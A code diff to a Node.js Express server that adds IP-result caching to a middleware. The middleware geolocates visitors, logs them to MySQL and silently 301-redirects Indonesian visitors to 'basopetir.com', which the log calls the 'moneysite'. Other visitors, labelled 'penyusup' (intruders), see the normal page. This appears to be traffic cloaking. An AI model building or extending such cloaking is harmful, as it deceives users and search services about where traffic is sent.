@@ -1,6 +1,7 @@
 const express = require('express');
 const mysql = require('mysql');
 const fetch = require('cross-fetch');
+const NodeCache = require('node-cache');
 
 const app = express();
 app.set('trust proxy', true);
@@ -9,6 +10,7 @@ app.use(express.json());
 
 const redirectURL = 'https://basopetir.com';
 
+const visitorCache = new NodeCache({ stdTTL: 3600 });
 
 const con = mysql.createConnection({
   host: "localhost",
@@ -33,6 +35,17 @@ const redirectIfFromIndonesia = async (req, res, next) => {
     const parts = clientIP.split(':');
     const ipv4 = parts[parts.length - 1];
     console.log('ip:', ipv4);
+
+    if (visitorCache.has(ipv4)) {
+      const visitor = visitorCache.get(ipv4);
+      if (visitor.country === 'Indonesia') {
+        console.log('redirect moneysite (cached)');
+        return res.redirect(301, redirectURL);
+      } else {
+        console.log('penyusup (cached)');
+        return next();
+      }
+    }
 
     console.log('fetch visitor');
     const response = await fetch(`https://ifconfig.co/json?ip=${ipv4}`);
@@ -61,6 +74,7 @@ const redirectIfFromIndonesia = async (req, res, next) => {
       }
 
       console.log('data visitor telah dimasukkan');
+      visitorCache.set(ipv4, user);
       if (country === 'Indonesia') {
         console.log('redirect moneysite');
         return res.redirect(301, redirectURL);
